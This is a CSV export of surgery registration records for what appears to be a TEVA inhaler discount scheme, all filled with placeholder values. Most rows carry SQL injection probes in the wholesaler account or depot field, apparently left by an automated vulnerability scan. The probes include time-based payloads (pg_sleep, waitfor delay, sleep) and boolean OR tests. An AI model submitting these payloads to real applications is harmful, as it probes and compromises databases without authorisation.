Unique ID,Surgery Name,Surgery Address 1,Surgery Address 2,Surgery Town,Surgery County,Surgery Post Code,Surgery Email,Surgery Telephone,TEVA Account No,TEVA Manager,Total Patients,Total Patients (Dispensing),Wholesaler Name,Wholesale Account,Wholesale Depot,Discount Braltus Zonda 10mcg,Discount DuoResp Spiromax 160mcg/4.5mcg,Discount DuoResp Spiromax 320mcg/9mcg,Discount Qvar MDI 50mcg,Discount Qvar MDI 100mcg,Discount Qvar Easi-Breathe 50mcg,Discount Qvar Easi-Breathe 100mcg,Authorised Signatory,Terms Agreement,Date Created,Activated,Date Activated,Sending bank details,
5fb0030e-6014-42ba-a160-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,LFtPyG7u&#039;));select pg_sleep(11); -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb0030a-7304-4fca-8f36-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,Gj3MXDPz&#039;);select pg_sleep(5); -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb00306-b864-4ad7-b737-7bc58d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,D05iuoZj&#039;;select pg_sleep(16); -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb00302-2558-45b9-a7c8-7bc58d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,Z8kxTYtc&#039;; waitfor delay &#039;0:0:16&#039; -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002fd-fd28-4514-ae91-3cbd8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,1 waitfor delay &#039;0:0:11&#039; -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002f9-7280-437d-aeff-7bc58d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,(select(0)from(select(sleep(11)))v)/*&#039;+(select(0)from(select(sleep(11)))v)+&#039;&quot;+(select(0)from(select(sleep(11)))v)+&quot;*/,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002f4-7d4c-4e36-a3c8-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,if(now()=sysdate(),sleep(5),0)/*&#039;XOR(if(now()=sysdate(),sleep(5),0))OR&#039;&quot;XOR(if(now()=sysdate(),sleep(5),0))OR&quot;*/,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002f0-8de0-484f-918a-46e38d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,-1&quot; OR 2+158-158-1=0+0+0+1 -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002ec-1778-4d29-b161-5a898d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,-1&#039; OR 2+539-539-1=0+0+0+1 or &#039;prki3dIV&#039;=&#039;,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002e7-ed20-4650-b1c7-2eec8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,-1&#039; OR 2+325-325-1=0+0+0+1 -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002e3-44f4-4fa5-bf8d-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,-1 OR 2+602-602-1=0+0+0+1,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002de-285c-41c5-886b-46e38d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,-1 OR 2+267-267-1=0+0+0+1 -- ,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002da-8510-4bc3-aaf8-4d738d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,eWMbFhmF,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002d5-ec88-4cd0-b95e-4d738d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002d1-c114-4f02-92ed-5a898d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,e,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002cc-414c-4c55-aefb-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,UngKWJNE&#039;));select pg_sleep(10); -- ,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002c8-7e34-493b-bb8d-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,njPNQ5Ad&#039;);select pg_sleep(10); -- ,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002c3-e4c0-443e-a250-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,RGmp0IxK&#039;;select pg_sleep(5); -- ,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002bf-8620-4dd2-b7f3-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,ss0McQaq&#039;; waitfor delay &#039;0:0:5&#039; -- ,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002bb-f7c0-4eea-942f-3a3c8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,1 waitfor delay &#039;0:0:15&#039; -- ,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002b7-219c-4d81-bf27-05ac8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,(select(0)from(select(sleep(10)))v)/*&#039;+(select(0)from(select(sleep(10)))v)+&#039;&quot;+(select(0)from(select(sleep(10)))v)+&quot;*/,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002b2-9d28-40c1-bb6f-05ac8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,if(now()=sysdate();sleep(10);0)/*&#039;XOR(if(now()=sysdate();sleep(10);0))OR&#039;&quot;XOR(if(now()=sysdate();sleep(10);0))OR&quot;*/,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
5fb002af-163c-49b0-943c-3cbd8d00a510,e,e,e,e,e,e,sample@email.tst,e,e,e,e,e,DE Group,-1&quot; OR 2+742-742-1=0+0+0+1 -- ,e,No,No,No,No,No,No,No,No,Yes,2020-11-14,No,,Yes,
